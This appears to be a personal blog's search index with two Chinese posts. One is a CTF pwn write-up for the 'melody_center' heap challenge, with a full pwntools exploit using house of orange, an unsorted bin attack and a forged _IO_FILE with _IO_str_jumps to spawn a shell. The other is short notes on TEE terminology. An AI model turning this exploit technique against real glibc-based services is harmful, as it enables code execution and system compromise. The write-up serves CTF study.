<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn heap: melody_center</title>
      <link href="/2020/02/07/pwn-heap-melody-center/"/>
      <url>/2020/02/07/pwn-heap-melody-center/</url>
      
        <content type="html"><![CDATA[<p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>保护全开，题目给了四个功能：</p><pre><code>1. Create                      2. Edit                        3. Show                        4. Exit</code></pre><p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p><pre><code>           (chunk_1)+----+----+                    |    |0x31|          +----+----+(chunk_2)                    +----+----+          |    |size|              +-----|    |    |--------&gt; +----+----+              |     +----+----+          |    |    |              |     |    |    |          +----+----+              |     +----+----+          |    |    |              |                          +----+----+              |                          ...........              |                          +----+----+(chunk_3)              |                          |    |0x21|              |                          +----+----+              +------------------------&gt; |    |    |                                         +----+----+</code></pre><p><br />Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br />Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br />Exit就是调用exit(0)（用不上）</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li><p>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</p></li><li><p>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</p></li><li><p>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。</p><pre><code>malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</code></pre><p>但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。</p><pre><code class="C">_IO_str_finish (_IO_FILE *fp, int dummy){if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))  (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]fp-&gt;_IO_buf_base = NULL;_IO_default_finish (fp, 0);}</code></pre></li><li><p>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</p></li><li><p>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：</p><ol><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li><li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li><li><code>fp-&gt;_flags</code>= 0</li><li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li><li><code>fp+0xe8</code> = system_addr</li></ol></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">def create(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def edit(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def show():    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)    return p.recvuntil(&quot;==========&quot;)def exit():    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)def pack_file(_flags = 0,              _IO_read_ptr = 0,              _IO_read_end = 0,              _IO_read_base = 0,              _IO_write_base = 0,              _IO_write_ptr = 0,              _IO_write_end = 0,              _IO_buf_base = 0,              _IO_buf_end = 0,              _IO_save_base = 0,              _IO_backup_base = 0,              _IO_save_end = 0,              _IO_marker = 0,              _IO_chain = 0,              _fileno = 0,              _lock = 0,              _wide_data = 0,              _mode = 0):    file_struct = p32(_flags) + \                  p32(0) + \                  p64(_IO_read_ptr) + \                  p64(_IO_read_end) + \                  p64(_IO_read_base) + \                  p64(_IO_write_base) + \                  p64(_IO_write_ptr) + \                  p64(_IO_write_end) + \                  p64(_IO_buf_base) + \                  p64(_IO_buf_end) + \                  p64(_IO_save_base) + \                  p64(_IO_backup_base) + \                  p64(_IO_save_end) + \                  p64(_IO_marker) + \                  p64(_IO_chain) + \                  p32(_fileno)    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)    file_struct += p64(_lock)    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)    file_struct += p64(_wide_data)    file_struct = file_struct.ljust(0xc0, &#39;\x00&#39;)    file_struct += p64(_mode)    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)    return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr):    payload = pack_file(_flags = 0,                        _IO_read_ptr = 0x61, #smallbin5file_size                        _IO_read_end = main_arena_addr,                        _IO_read_base = _IO_list_all_ptr - 0x10, # unsorted bin attack _IO_list_all_ptr,                        _IO_write_base = 0,                        _IO_write_ptr = 1,                        _IO_buf_base = binsh_addr,                        _mode = 0,                        )    payload += p64(_IO_str_jumps_addr - 8)    payload += p64(0) # paddding    payload += p64(system_addr)    return payloadmain_arena_offset = 0x3c1b00_IO_list_all_offset = 0x3c2500_IO_str_jumps_offset = 0x3be4c0system_offset = 0x456a0str_bin_sh_offset = 0x18ac40# old top chunk ==&gt; unsorted bincreate(0x8d8, &quot;A&quot; * 8 + &quot;\n&quot;, 217, 108)edit(0x900, &quot;A&quot; * 0x8d8 + p64(0x21) + &quot;A&quot; * 0x18 + p64(0x6d1), 217, 108)create(0x900, &quot;B&quot; * 8 + &quot;\n&quot;, 217, 108)# leak main_arena and then leak libccreate(8, &quot;B&quot; * 8, 217, 108)res = show()main_arena = u64(res[0x18:0x1e].ljust(8, &#39;\x00&#39;))libc_base = main_arena - 0x58 - main_arena_offset_IO_list_all = libc_base + _IO_list_all_offset_IO_str_jumps = libc_base + _IO_str_jumps_offsetsystem = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offset# use unsorted bin attack to make _IO_list_all = main_arena + 0x58# thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 ==&gt; small bin[5] (size = 0x60)# fake a _IO_FILE struct in small bin[4] by writing the unsorted bin# make use of _IO_str_jumps-&gt;_IO_str_finishpayload = &quot;E&quot; * 0x30 payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)edit(0x300, payload + &quot;\n&quot; , 217, 108)#create(0x100, &quot;D&quot; * 7 + &quot;\n&quot;, 217, 108)success(&quot;main_arena: &quot; + hex(main_arena))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;_IO_list_all: &quot; + hex(_IO_list_all))success(&quot;_IO_str_jumps: &quot; + hex(_IO_str_jumps))success(&quot;system: &quot; + hex(system))success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))p.interactive()</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li><li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li><li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li></ol><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p><ol><li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于TEE的一些预备知识</title>
      <link href="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>常见缩略词：</p></blockquote><ul><li><b>REE</b>: Rich Execution Environment</li><li><b>TEE</b>: Trusted Execution Environment</li><li><b>OP-TEE</b>: Open Portable Trusted Execution Environment</li><li><b>SoC</b>: System on Chip</li><li><b>RPK</b>: Real-Time Kernel Protection</li><li><b>PKM</b>: Periodic Kernel Measurement</li><li><b>SMC</b>: Secure Monitor Call</li><li><b>ATF</b>: ARM-Trusted-Firmware </li><li><b>OTA</b>: Over-The-Air</li><li><b>FIQ</b>: Fast Interrupt Request (Internal)</li><li><b>IRQ</b>: Interrupt Request (External)</li><li><b>TZASC</b>: TrustZone Address Space Controller</li><li><b>TZPC</b>: TrustZone Protection Controller</li><li><b>TZMA</b>: TrustZone Memory Adapter</li><li><b>TCB</b>: Trusted Computing Base</li><li><b>HIEE</b>: Hardware-assisted Isolated Execution Environments</li></ul><blockquote><p>不同架构下或不同应用中的TEE (Real Product)</p></blockquote><ul><li>TPM (Trusted Platform Module)</li><li></li><li>ARM TrustZone</li><li>ARM SCP (System Co Processor)</li><li>Intel SMM (System Management Mode)</li><li>Intel TXT (Trusted Execution Technology)</li><li>Intel SGX (Software Guarded Extension)</li><li>Intel ME (Management Engine)</li><li>AMD PSP (Platform Security Processor)</li><li></li><li>Google Titan</li><li>MS Azure Pluton</li><li>Apple Secure Enclave</li><li>Apple T2</li></ul>]]></content>
      
      
      <categories>
          
          <category> LearningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustZone </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
